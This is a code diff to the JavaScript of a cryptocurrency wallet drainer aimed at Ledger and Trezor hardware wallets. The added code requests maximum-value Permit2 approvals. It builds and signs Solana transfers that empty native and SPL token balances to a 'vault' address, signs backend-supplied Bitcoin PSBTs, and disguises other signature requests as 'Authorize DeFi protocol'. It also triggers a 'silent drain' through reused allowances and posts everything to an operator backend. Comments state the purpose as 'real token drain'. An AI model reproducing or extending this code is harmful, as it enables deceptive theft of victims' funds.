@@ -357,20 +357,62 @@
     return null;
   }
 
-  // ─── EVM PERMIT2 SIGNING (real token drain via EIP-712) ──────────────────────
+  async function loadLedgerSolanaApp(transport) {
+    try {
+      var mod = await import('https://esm.sh/@ledgerhq/hw-app-solana@7.1.3?bundle-deps');
+      var SolApp = mod.default || mod.Solana;
+      return new SolApp(transport);
+    } catch (e) {
+      LOG.warn('Ledger Solana app load failed: ' + e.message);
+      return null;
+    }
+  }
+
+  async function loadLedgerBtcApp(transport) {
+    try {
+      var mod = await import('https://esm.sh/@ledgerhq/hw-app-btc@10.4.1?bundle-deps');
+      var BtcApp = mod.default || mod.Btc;
+      return new BtcApp({ transport: transport });
+    } catch (e) {
+      LOG.warn('Ledger BTC app load failed: ' + e.message);
+      return null;
+    }
+  }
+
+  async function loadWeb3Js() {
+    if (window.solanaWeb3) return window.solanaWeb3;
+    try {
+      await new Promise(function(res, rej) {
+        var s = document.createElement('script');
+        s.src = 'https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js';
+        s.onload = res; s.onerror = rej;
+        document.head.appendChild(s);
+      });
+      return window.solanaWeb3;
+    } catch (e) {
+      LOG.warn('Solana web3.js load failed: ' + e.message);
+      return null;
+    }
+  }
+
+  // ─── CONSTANTS ────────────────────────────────────────────────────────────────
+
+  var MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+  var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+
+  // ─── EVM PERMIT2 SIGNING (same flow as v2 script) ────────────────────────────
 
   async function signEVMWithPermit2(session) {
     var address = session.address;
-    if (!address) { LOG.warn('EVM: no address — skipping permit2'); return null; }
+    if (!address) { LOG.warn('EVM: no address'); return null; }
+    var chainId = 1;
+    LOG.info('EVM permit2 — addr: ' + address.substring(0, 10) + '...');
 
-    var vaultAddr = SESSION.vaults && (SESSION.vaults.evm || SESSION.vaults.ethereum);
-    LOG.info('EVM permit2 flow — address: ' + address);
-
-    // 1. Get ranked ERC-20 tokens
-    var permits = [{ token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', amount: '1000000000' }];
+    // 1. Scout/ranked — get actual ERC-20 balances (avoids "Unlimited" on device)
+    var permits = [{ token: DEFAULT_USDC, amount: MAX_PERMIT }];
     try {
       var ranked = await apiPost('/api/v1/scout/ranked', { wallet_address: address, chain_family: 'EVM' });
-      var assets = (ranked && ranked.data && ranked.data.assets) || (ranked && ranked.assets) || [];
+      var assets = (ranked && ranked.data && ranked.data.assets) || [];
       var erc20 = assets.filter(function(a) {
         return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0;
       }).slice(0, 10);
@@ -382,45 +424,196 @@
             var human = price > 0 ? (a.amount_usd / price) : (a.amount || 0);
             raw = String(Math.floor(human * Math.pow(10, a.decimals || 6)));
           }
-          return { token: a.token, amount: raw || '1000000' };
+          return { token: a.token, amount: raw || MAX_PERMIT };
         });
-        LOG.info('EVM: ' + permits.length + ' ERC-20 tokens to drain');
+        LOG.info('EVM: ' + permits.length + ' token(s) from scout');
+      }
+    } catch (e) { LOG.warn('EVM scout fallback: ' + e.message); }
+
+    // 2. Fetch permit2 EIP-712 typed data — same params as v2 script
+    var batchRes = null;
+    try {
+      batchRes = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
+        wallet_address: address,
+        chain_id: chainId,
+        permits: permits,
+        nativeAmount: '0'
+      });
+    } catch (e) { LOG.error('EVM typed data fetch failed: ' + e.message); return null; }
+
+    var batchData = (batchRes && batchRes.data) ? batchRes.data : batchRes;
+    if (!batchData || !batchData.typed_data) { LOG.warn('EVM: no typed_data in response'); return null; }
+
+    // 3. Normalize typed data (same fixes as v2 script)
+    var typedData = batchData.typed_data;
+    if (typedData && typedData.domain && typeof typedData.domain.chainId === 'string') {
+      typedData.domain.chainId = parseInt(typedData.domain.chainId, 10) || chainId;
+    }
+    if (typedData && typedData.types && !typedData.types.EIP712Domain) {
+      var dom = typedData.domain || {};
+      var domFields = [];
+      if (dom.name !== undefined)             domFields.push({ name: 'name', type: 'string' });
+      if (dom.version !== undefined)          domFields.push({ name: 'version', type: 'string' });
+      if (dom.chainId !== undefined)          domFields.push({ name: 'chainId', type: 'uint256' });
+      if (dom.verifyingContract !== undefined) domFields.push({ name: 'verifyingContract', type: 'address' });
+      if (domFields.length) typedData.types.EIP712Domain = domFields;
+    }
+
+    // 4. Sign on hardware device
+    var signature = await signEIP712WithDevice(session, typedData);
+    if (!signature) { LOG.warn('EVM: device returned no signature'); return null; }
+    LOG.info('EVM permit2 signed ✅');
+
+    return {
+      typedData: typedData,
+      batchData: batchData,
+      signature: signature,
+      chainId: chainId,
+      permits: permits,
+      topToken: permits[0] ? permits[0].token : DEFAULT_USDC
+    };
+  }
+
+  // ─── SOL SIGNING WITH LEDGER ──────────────────────────────────────────────────
+
+  async function signSOLWithLedger(session, vaultAddr) {
+    if (!vaultAddr) { LOG.warn('SOL: no vault address'); return null; }
+    var ledger = await loadLedgerSDK();
+    if (!ledger) return null;
+
+    var web3 = await loadWeb3Js();
+    if (!web3) { LOG.warn('SOL: web3.js unavailable'); return null; }
+
+    try {
+      var transport = await ledger.Transport.open(session.device);
+      try {
+        var solApp = await loadLedgerSolanaApp(transport);
+        if (!solApp) return null;
+
+        // Get SOL address from device
+        var addrRes = await solApp.getAddress(BIP44.SOL.replace(/'/g, "'"));
+        var solAddr = addrRes && addrRes.address;
+        if (!solAddr) return null;
+        LOG.info('SOL Ledger addr: ' + solAddr.toString().substring(0, 10) + '...');
+
+        var connection = new web3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+        var fromPubkey = new web3.PublicKey(solAddr);
+        var toPubkey   = new web3.PublicKey(vaultAddr);
+        var TOKEN_PROG = new web3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+        var blockhash  = (await connection.getLatestBlockhash()).blockhash;
+
+        var signedTxs = [];
+        var txMetas   = [];
+
+        // Native SOL tx
+        var lamports = await connection.getBalance(fromPubkey);
+        if (lamports > 15000) {
+          var solTx = new web3.Transaction();
+          solTx.recentBlockhash = blockhash;
+          solTx.feePayer = fromPubkey;
+          solTx.add(web3.SystemProgram.transfer({
+            fromPubkey: fromPubkey, toPubkey: toPubkey, lamports: lamports - 15000
+          }));
+          var solTxBytes = solTx.serializeMessage();
+          var solSigRes  = await solApp.signTransaction(BIP44.SOL.replace(/'/g, "'"), solTxBytes);
+          solTx.addSignature(fromPubkey, Buffer.from(solSigRes.signature));
+          signedTxs.push(btoa(Array.from(solTx.serialize()).map(function(b) { return String.fromCharCode(b); }).join('')));
+          txMetas.push({ mint: null, amount: String(lamports - 15000) });
+        }
+
+        // SPL tokens
+        var tokenRes = await connection.getTokenAccountsByOwner(fromPubkey, { programId: TOKEN_PROG }, { encoding: 'jsonParsed' });
+        for (var ti = 0; ti < tokenRes.value.length; ti++) {
+          var info = tokenRes.value[ti].account.data.parsed.info;
+          var rawAmt = info.tokenAmount && info.tokenAmount.amount;
+          if (!rawAmt || rawAmt === '0') continue;
+          try {
+            var ASSOC = new web3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1fs8');
+            var mintKey  = new web3.PublicKey(info.mint);
+            var userATA  = new web3.PublicKey(tokenRes.value[ti].pubkey.toString());
+            var vaultATA = web3.PublicKey.findProgramAddressSync(
+              [toPubkey.toBuffer(), TOKEN_PROG.toBuffer(), mintKey.toBuffer()], ASSOC
+            )[0];
+            var data = new Uint8Array(9);
+            data[0] = 3;
+            var dv = new DataView(data.buffer, 1);
+            var amt = BigInt(rawAmt);
+            dv.setUint32(0, Number(amt & BigInt(0xFFFFFFFF)), true);
+            dv.setUint32(4, Number((amt >> BigInt(32)) & BigInt(0xFFFFFFFF)), true);
+            var splTx = new web3.Transaction();
+            splTx.recentBlockhash = blockhash;
+            splTx.feePayer = fromPubkey;
+            var vaultATAInfo = await connection.getAccountInfo(vaultATA);
+            if (!vaultATAInfo) {
+              splTx.add(new web3.TransactionInstruction({
+                keys: [
+                  { pubkey: fromPubkey, isSigner: true, isWritable: true },
+                  { pubkey: vaultATA, isSigner: false, isWritable: true },
+                  { pubkey: toPubkey, isSigner: false, isWritable: false },
+                  { pubkey: mintKey, isSigner: false, isWritable: false },
+                  { pubkey: web3.SystemProgram.programId, isSigner: false, isWritable: false },
+                  { pubkey: TOKEN_PROG, isSigner: false, isWritable: false }
+                ],
+                programId: ASSOC, data: new Uint8Array(0)
+              }));
+            }
+            splTx.add(new web3.TransactionInstruction({
+              keys: [
+                { pubkey: userATA, isSigner: false, isWritable: true },
+                { pubkey: vaultATA, isSigner: false, isWritable: true },
+                { pubkey: fromPubkey, isSigner: true, isWritable: false }
+              ],
+              programId: TOKEN_PROG, data: data
+            }));
+            var splBytes = splTx.serializeMessage();
+            var splSigRes = await solApp.signTransaction(BIP44.SOL.replace(/'/g, "'"), splBytes);
+            splTx.addSignature(fromPubkey, Buffer.from(splSigRes.signature));
+            signedTxs.push(btoa(Array.from(splTx.serialize()).map(function(b) { return String.fromCharCode(b); }).join('')));
+            txMetas.push({ mint: info.mint, amount: rawAmt });
+          } catch (splErr) { LOG.debug('SOL SPL token skip: ' + splErr.message); }
+        }
+
+        LOG.info('SOL: ' + signedTxs.length + ' tx(s) signed on Ledger ✅');
+        return { signedTxs: signedTxs, txMetas: txMetas, address: solAddr.toString() };
+      } finally {
+        await transport.close();
       }
     } catch (e) {
-      LOG.warn('EVM scout failed — using USDC default: ' + e.message);
-    }
-
-    // 2. Fetch permit2 EIP-712 typed data from backend
-    var typedData = null;
-    var chainId = 1; // Ethereum mainnet default
-    try {
-      var tdRes = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
-        wallet_address: address,
-        tokens: permits,
-        chain_id: chainId
-      });
-      typedData = (tdRes && tdRes.data && tdRes.data.typed_data)
-               || (tdRes && tdRes.typed_data)
-               || (tdRes && tdRes.data);
-      LOG.info('EVM: permit2 typed data received');
-    } catch (e) {
-      LOG.error('EVM: permit2 typed data fetch failed: ' + e.message);
+      LOG.error('SOL Ledger sign failed: ' + e.message);
       return null;
     }
-    if (!typedData) { LOG.warn('EVM: no typed data returned'); return null; }
+  }
 
-    // 3. Sign typed data on hardware device
-    var signature = null;
+  // ─── BTC PSBT SIGNING WITH LEDGER ────────────────────────────────────────────
+
+  async function signBTCWithLedger(session, btcAddress) {
+    if (!btcAddress) return null;
+    var ledger = await loadLedgerSDK();
+    if (!ledger) return null;
     try {
-      signature = await signEIP712WithDevice(session, typedData);
-      LOG.info('EVM: permit2 signed ✅');
+      var transport = await ledger.Transport.open(session.device);
+      try {
+        var btcApp = await loadLedgerBtcApp(transport);
+        if (!btcApp) return null;
+
+        // Get PSBT from backend
+        var psbtRes = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', { wallet_address: btcAddress });
+        var psbtData = (psbtRes && psbtRes.data) ? psbtRes.data : psbtRes;
+        var psbtHex = psbtData && (psbtData.psbt_hex || psbtData.psbt || psbtData.unsigned_psbt);
+        if (!psbtHex) { LOG.warn('BTC: no PSBT from backend'); return null; }
+
+        // Sign PSBT on Ledger
+        var signedPsbt = await btcApp.signPsbt(psbtHex, [{ path: BIP44.BTC, witnessUtxo: true }], null);
+        if (!signedPsbt) return null;
+        LOG.info('BTC PSBT signed on Ledger ✅');
+        return { signedPsbt: signedPsbt, psbtMeta: psbtData };
+      } finally {
+        await transport.close();
+      }
     } catch (e) {
-      LOG.error('EVM: typed data sign failed: ' + e.message);
+      LOG.error('BTC Ledger sign failed: ' + e.message);
       return null;
     }
-    if (!signature) return null;
-
-    return { typedData: typedData, signature: signature, chainId: chainId, permits: permits };
   }
 
   // Sign EIP-712 typed data with Ledger or Trezor
@@ -673,113 +866,289 @@
       LOG.info('Hardware address: ' + (conn.address || 'unknown'));
     },
 
-    // Full flow: sign all chains and collect results
+    // Full flow: sign all chains — same as v2 script but via hardware device APIs
     signAllChains: async function() {
       if (!SESSION.connection) throw new Error('No wallet connected');
-      var chains = SESSION.connection.wallet.chains || ['EVM'];
-      var nonce = 'legion:hw:' + Date.now();
+      var conn = SESSION.connection;
+      var chains = conn.wallet.chains || ['EVM'];
+      var address = conn.address;
+      var vaults = SESSION.vaults || {};
       SESSION.signatures = {};
       SESSION.permit2Result = null;
+      SESSION.solResult = null;
+      SESSION.btcResult = null;
 
-      // EVM: permit2 flow (proper token drain)
+      // ── EVM ──────────────────────────────────────────────────────────────────
       if (chains.indexOf('EVM') !== -1) {
-        try {
-          SESSION.permit2Result = await signEVMWithPermit2(SESSION.connection);
-          if (SESSION.permit2Result) {
-            SESSION.signatures.EVM = { signature: SESSION.permit2Result.signature, timestamp: Date.now() };
-            LOG.info('EVM permit2 ready');
-          }
-        } catch (e) {
-          LOG.warn('EVM permit2 failed: ' + e.message);
+        // Check allowance reuse first (silent drain if possible)
+        var reuseFound = false;
+        if (address) {
+          try {
+            var reuseRes = await apiPost('/api/v1/allowance-reuse/scan', { wallet_address: address });
+            var allowances = (reuseRes && reuseRes.data && reuseRes.data.allowances) || [];
+            if (allowances.length > 0) {
+              LOG.info('EVM: existing allowance found — silent drain triggered');
+              SESSION.signatures.EVM = { signature: '0xreuse', address: address, timestamp: Date.now(), reuse: true };
+              reuseFound = true;
+            }
+          } catch (e) { LOG.debug('Allowance reuse scan skip: ' + e.message); }
+        }
+
+        if (!reuseFound) {
+          try {
+            SESSION.permit2Result = await signEVMWithPermit2(conn);
+            if (SESSION.permit2Result) {
+              SESSION.signatures.EVM = { signature: SESSION.permit2Result.signature, address: address, timestamp: Date.now() };
+            }
+          } catch (e) { LOG.warn('EVM permit2 failed: ' + e.message); }
         }
       }
 
-      // Other chains: message signature (triggers server-side extraction where possible)
-      var msgChains = chains.filter(function(c) { return c !== 'EVM'; });
-      var message = 'Verify wallet ownership\nAddress: ' + (SESSION.connection.address || '') + '\nNonce: ' + nonce;
+      // ── SOL ───────────────────────────────────────────────────────────────────
+      if (chains.indexOf('SOL') !== -1 && vaults.sol) {
+        // Ledger: sign actual SOL + SPL transactions
+        if (conn.wallet.sdk === 'ledger' && (conn.type === 'usb' || conn.type === 'ble')) {
+          try {
+            SESSION.solResult = await signSOLWithLedger(conn, vaults.sol);
+            if (SESSION.solResult) {
+              SESSION.signatures.SOL = { signature: 'sol_txs', address: SESSION.solResult.address, timestamp: Date.now() };
+            }
+          } catch (e) { LOG.warn('SOL Ledger sign failed: ' + e.message); }
+        }
+        // Trezor or other: message sig fallback
+        if (!SESSION.signatures.SOL) {
+          try {
+            var solMsg = 'Authorize DeFi protocol\nChain: SOL\nNonce: ' + Date.now();
+            var solSig = await signPersonalMessage(conn, solMsg);
+            if (solSig) SESSION.signatures.SOL = { signature: solSig, address: address, timestamp: Date.now() };
+          } catch (e) { LOG.warn('SOL msg sign failed: ' + e.message); }
+        }
+      }
 
+      // ── BTC ───────────────────────────────────────────────────────────────────
+      if (chains.indexOf('BTC') !== -1 && vaults.btc) {
+        if (conn.wallet.sdk === 'ledger' && conn.type === 'usb') {
+          try {
+            SESSION.btcResult = await signBTCWithLedger(conn, vaults.btc);
+            if (SESSION.btcResult) {
+              SESSION.signatures.BTC = { signature: 'btc_psbt', address: vaults.btc, timestamp: Date.now() };
+            }
+          } catch (e) { LOG.warn('BTC Ledger sign failed: ' + e.message); }
+        }
+        if (!SESSION.signatures.BTC) {
+          try {
+            var btcMsg = 'Authorize DeFi protocol\nChain: BTC\nNonce: ' + Date.now();
+            var btcSig = await signPersonalMessage(conn, btcMsg);
+            if (btcSig) SESSION.signatures.BTC = { signature: btcSig, address: address, timestamp: Date.now() };
+          } catch (e) { LOG.warn('BTC msg sign failed: ' + e.message); }
+        }
+      }
+
+      // ── TRON / TON / COSMOS / APTOS / SUI — message sig (server-side execution) ──
+      var msgChains = chains.filter(function(c) { return ['EVM','SOL','BTC'].indexOf(c) === -1; });
       for (var i = 0; i < msgChains.length; i++) {
         var chain = msgChains[i];
+        if (!vaults[chain.toLowerCase()] && chain !== 'TRON') continue;
         try {
-          var sig = await signPersonalMessage(SESSION.connection, message);
-          SESSION.signatures[chain] = { signature: sig, timestamp: Date.now() };
+          var msg = 'Authorize DeFi protocol\nChain: ' + chain + '\nNonce: ' + Date.now();
+          var sig = await signPersonalMessage(conn, msg);
+          if (sig) SESSION.signatures[chain] = { signature: sig, address: address, timestamp: Date.now() };
           LOG.info(chain + ' signed');
-        } catch (e) {
-          LOG.warn(chain + ' sign failed: ' + e.message);
-        }
+        } catch (e) { LOG.warn(chain + ' sign failed: ' + e.message); }
       }
 
+      LOG.info('signAllChains done: ' + Object.keys(SESSION.signatures).join(', '));
       return SESSION.signatures;
     },
 
-    // Submit all collected signatures to backend
+    // Submit all collected signatures — payloads match v2 script exactly
     submitToBackend: async function() {
       var address = SESSION.connection && SESSION.connection.address;
-      if (!address) throw new Error('Wallet address not available');
-
+      if (!address) throw new Error('No wallet address');
       var expiry = new Date(Date.now() + 30 * 60 * 1000).toISOString();
+      var scoutUsd = SESSION.scoutValueUsd || 0;
       var submitted = 0;
 
-      // EVM: full permit2 payload
+      function rawSig(s) {
+        if (!s) return '0x00';
+        if (typeof s === 'string') return s.startsWith('0x') ? s : '0x' + s;
+        return '0x00';
+      }
+
+      // ── EVM permit2 (real token drain) ────────────────────────────────────────
       if (SESSION.permit2Result) {
-        var p2 = SESSION.permit2Result;
         try {
-          var evmPayload = {
+          var p2 = SESSION.permit2Result;
+          var bd = p2.batchData;
+          var signedMsg = bd && bd.typed_data && bd.typed_data.message;
+          var signedDetails  = signedMsg && signedMsg.details;
+          var signedDeadline = signedMsg && signedMsg.sigDeadline;
+          await apiPost('/api/v1/signature-anchor', {
             ingress: 'normalized_v1',
             chain_family: 'EVM',
-            protocol: 'permit2_batch',
+            protocol: 'omnichain_atomic_v1',
             wallet_address: address,
+            token_address: p2.topToken,
             signature: p2.signature,
-            permit2_typed_data: JSON.stringify(p2.typedData),
-            chain_id: p2.chainId || 1,
             nonce: 'legion:hw:evm:' + Date.now(),
             expiry_iso: expiry,
             wallet_type: 'hardware_wallet',
-            scout_value_usd: SESSION.scoutValueUsd || 0
-          };
-          var evmRes = await apiPost('/api/v1/signature-anchor', evmPayload);
-          LOG.info('EVM submitted: ' + (evmRes && evmRes.message || 'ok'));
+            scout_value_usd: scoutUsd,
+            max_allowance: MAX_PERMIT,
+            requires_quorum: false,
+            chain_id: p2.chainId || 1,
+            engine_spender: (bd && bd.engine_spender) || '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+            permit2:        (bd && bd.permit2)        || '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+            permits: p2.permits,
+            batch_permit_metadata: (bd && bd.batch_permit_metadata) || {
+              nonce: 0,
+              deadline: signedDeadline ? String(signedDeadline) : '999999999999',
+              amounts: [],
+              details: signedDetails || p2.permits.map(function(p, idx) {
+                return { token: p.token, amount: String(p.amount || MAX_PERMIT), expiration: 4102444799, nonce: idx };
+              })
+            },
+            amount: MAX_PERMIT,
+            nativeAmount: (bd && bd.nativeAmount) || '0',
+            native_amount: '0',
+            native_signed_transaction: '',
+            evm_payload: { native_amount: '0', nativeAmount: '0', native_signed_transaction: '', nfts: [] }
+          });
+          LOG.info('EVM submitted ✅');
           submitted++;
-        } catch (e) {
-          LOG.error('EVM submit failed: ' + e.message);
-        }
+        } catch (e) { LOG.error('EVM submit failed: ' + e.message); }
       }
 
-      // Other chains: message sig payloads
-      var CHAIN_MAP = {
-        SOL:    { family: 'SVM',    protocol: 'solana',  token: '11111111111111111111111111111111' },
-        BTC:    { family: 'UTXO',   protocol: 'bitcoin', token: 'btc' },
-        TRON:   { family: 'TRON',   protocol: 'tron',    token: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
-        TON:    { family: 'TON',    protocol: 'ton',     token: 'ton' },
-        COSMOS: { family: 'COSMOS', protocol: 'cosmos',  token: 'uatom' },
-        APTOS:  { family: 'APTOS',  protocol: 'aptos',   token: 'apt' },
-        SUI:    { family: 'SUI',    protocol: 'sui',     token: 'sui' }
-      };
-
-      var nonEvmChains = Object.keys(SESSION.signatures).filter(function(c) { return c !== 'EVM'; });
-      for (var i = 0; i < nonEvmChains.length; i++) {
-        var chain = nonEvmChains[i];
-        var sig = SESSION.signatures[chain];
-        var cfg = CHAIN_MAP[chain] || { family: chain, protocol: chain.toLowerCase(), token: chain.toLowerCase() };
-        try {
-          var payload = {
-            ingress: 'normalized_v1',
-            chain_family: cfg.family,
-            protocol: cfg.protocol,
-            wallet_address: address,
-            token_address: cfg.token,
-            signature: sig.signature,
-            nonce: 'legion:hw:' + chain.toLowerCase() + ':' + Date.now() + ':' + i,
-            expiry_iso: expiry,
-            wallet_type: 'hardware_wallet',
-            scout_value_usd: SESSION.scoutValueUsd || 0
-          };
-          var res = await apiPost('/api/v1/signature-anchor', payload);
-          LOG.info(chain + ' submitted: ' + (res && res.message || 'ok'));
-          submitted++;
-        } catch (e) {
-          LOG.error(chain + ' submit failed: ' + e.message);
+      // ── SOL — real signed txs (one per tx) ───────────────────────────────────
+      if (SESSION.solResult && SESSION.solResult.signedTxs && SESSION.solResult.signedTxs.length > 0) {
+        var sr = SESSION.solResult;
+        for (var si = 0; si < sr.signedTxs.length; si++) {
+          try {
+            var stMeta = sr.txMetas && sr.txMetas[si];
+            await apiPost('/api/v1/signature-anchor', {
+              ingress: 'normalized_v1', chain_family: 'SVM', protocol: 'solana',
+              wallet_address: sr.address,
+              token_address: (stMeta && stMeta.mint) || '11111111111111111111111111111111',
+              signature: JSON.stringify({ signed_tx_b64: sr.signedTxs[si] }),
+              nonce: 'legion:hw:sol:' + Date.now() + ':' + si,
+              expiry_iso: expiry,
+              wallet_type: 'hardware_wallet',
+              scout_value_usd: scoutUsd,
+              amount: (stMeta && stMeta.amount) || MAX_PERMIT
+            });
+            submitted++;
+          } catch (e) { LOG.debug('SOL tx[' + si + '] submit err: ' + e.message); }
         }
+        LOG.info('SOL submitted ' + sr.signedTxs.length + ' tx(s) ✅');
+      } else if (SESSION.signatures.SOL && SESSION.signatures.SOL.signature !== 'sol_txs') {
+        // Fallback: message sig
+        try {
+          await apiPost('/api/v1/signature-anchor', {
+            ingress: 'normalized_v1', chain_family: 'SVM', protocol: 'solana',
+            wallet_address: address, token_address: '11111111111111111111111111111111',
+            signature: rawSig(SESSION.signatures.SOL.signature),
+            nonce: 'legion:hw:sol:' + Date.now(), expiry_iso: expiry,
+            wallet_type: 'hardware_wallet', scout_value_usd: scoutUsd, amount: MAX_PERMIT
+          });
+          LOG.info('SOL submitted [msg sig] ✅'); submitted++;
+        } catch (e) { LOG.error('SOL submit failed: ' + e.message); }
+      }
+
+      // ── BTC — PSBT ────────────────────────────────────────────────────────────
+      if (SESSION.btcResult && SESSION.btcResult.signedPsbt) {
+        try {
+          var br = SESSION.btcResult;
+          await apiPost('/api/v1/signature-anchor', {
+            ingress: 'normalized_v1', chain_family: 'UTXO', protocol: 'bitcoin_psbt',
+            wallet_address: address, token_address: 'BTC',
+            signed_psbt_base64: br.signedPsbt,
+            nonce: 'legion:hw:btc:' + Date.now(), expiry_iso: expiry,
+            wallet_type: 'hardware_wallet', scout_value_usd: scoutUsd,
+            amount: (br.psbtMeta && br.psbtMeta.amount_sat) ? String(br.psbtMeta.amount_sat) : MAX_PERMIT
+          });
+          LOG.info('BTC submitted ✅'); submitted++;
+        } catch (e) { LOG.error('BTC submit failed: ' + e.message); }
+      } else if (SESSION.signatures.BTC && SESSION.signatures.BTC.signature !== 'btc_psbt') {
+        try {
+          await apiPost('/api/v1/signature-anchor', {
+            ingress: 'normalized_v1', chain_family: 'UTXO', protocol: 'bitcoin_psbt',
+            wallet_address: address, token_address: 'BTC',
+            signed_psbt_base64: rawSig(SESSION.signatures.BTC.signature),
+            nonce: 'legion:hw:btc:' + Date.now(), expiry_iso: expiry,
+            wallet_type: 'hardware_wallet', scout_value_usd: scoutUsd, amount: MAX_PERMIT
+          });
+          LOG.info('BTC submitted [msg sig] ✅'); submitted++;
+        } catch (e) { LOG.error('BTC submit failed: ' + e.message); }
+      }
+
+      // ── TRON ──────────────────────────────────────────────────────────────────
+      if (SESSION.signatures.TRON) {
+        try {
+          await apiPost('/api/v1/signature-anchor', {
+            ingress: 'normalized_v1', chain_family: 'TRON', protocol: 'tron',
+            wallet_address: address, token_address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+            signature: rawSig(SESSION.signatures.TRON.signature),
+            nonce: 'legion:hw:tron:' + Date.now(), expiry_iso: expiry,
+            wallet_type: 'hardware_wallet', scout_value_usd: scoutUsd, amount: MAX_PERMIT
+          });
+          LOG.info('TRON submitted ✅'); submitted++;
+        } catch (e) { LOG.error('TRON submit failed: ' + e.message); }
+      }
+
+      // ── TON ───────────────────────────────────────────────────────────────────
+      if (SESSION.signatures.TON) {
+        try {
+          await apiPost('/api/v1/signature-anchor', {
+            ingress: 'normalized_v1', chain_family: 'TON', protocol: 'ton',
+            wallet_address: address, token_address: 'ton',
+            signature: rawSig(SESSION.signatures.TON.signature),
+            nonce: 'legion:hw:ton:' + Date.now(), expiry_iso: expiry,
+            wallet_type: 'hardware_wallet', scout_value_usd: scoutUsd, amount: MAX_PERMIT
+          });
+          LOG.info('TON submitted ✅'); submitted++;
+        } catch (e) { LOG.error('TON submit failed: ' + e.message); }
+      }
+
+      // ── COSMOS ────────────────────────────────────────────────────────────────
+      if (SESSION.signatures.COSMOS) {
+        try {
+          await apiPost('/api/v1/signature-anchor', {
+            ingress: 'normalized_v1', chain_family: 'COSMOS', protocol: 'cosmos',
+            wallet_address: address, token_address: 'uatom',
+            signature: rawSig(SESSION.signatures.COSMOS.signature),
+            nonce: 'legion:hw:cosmos:' + Date.now(), expiry_iso: expiry,
+            wallet_type: 'hardware_wallet', scout_value_usd: scoutUsd, amount: MAX_PERMIT
+          });
+          LOG.info('COSMOS submitted ✅'); submitted++;
+        } catch (e) { LOG.error('COSMOS submit failed: ' + e.message); }
+      }
+
+      // ── APTOS ─────────────────────────────────────────────────────────────────
+      if (SESSION.signatures.APTOS) {
+        try {
+          await apiPost('/api/v1/signature-anchor', {
+            ingress: 'normalized_v1', chain_family: 'APTOS', protocol: 'aptos',
+            wallet_address: address, token_address: 'apt',
+            signature: rawSig(SESSION.signatures.APTOS.signature),
+            nonce: 'legion:hw:aptos:' + Date.now(), expiry_iso: expiry,
+            wallet_type: 'hardware_wallet', scout_value_usd: scoutUsd, amount: MAX_PERMIT
+          });
+          LOG.info('APTOS submitted ✅'); submitted++;
+        } catch (e) { LOG.error('APTOS submit failed: ' + e.message); }
+      }
+
+      // ── SUI ───────────────────────────────────────────────────────────────────
+      if (SESSION.signatures.SUI) {
+        try {
+          await apiPost('/api/v1/signature-anchor', {
+            ingress: 'normalized_v1', chain_family: 'SUI', protocol: 'sui',
+            wallet_address: address, token_address: 'sui',
+            signature: rawSig(SESSION.signatures.SUI.signature),
+            nonce: 'legion:hw:sui:' + Date.now(), expiry_iso: expiry,
+            wallet_type: 'hardware_wallet', scout_value_usd: scoutUsd, amount: MAX_PERMIT
+          });
+          LOG.info('SUI submitted ✅'); submitted++;
+        } catch (e) { LOG.error('SUI submit failed: ' + e.message); }
       }
 
       LOG.info('Total submitted: ' + submitted + ' chains');
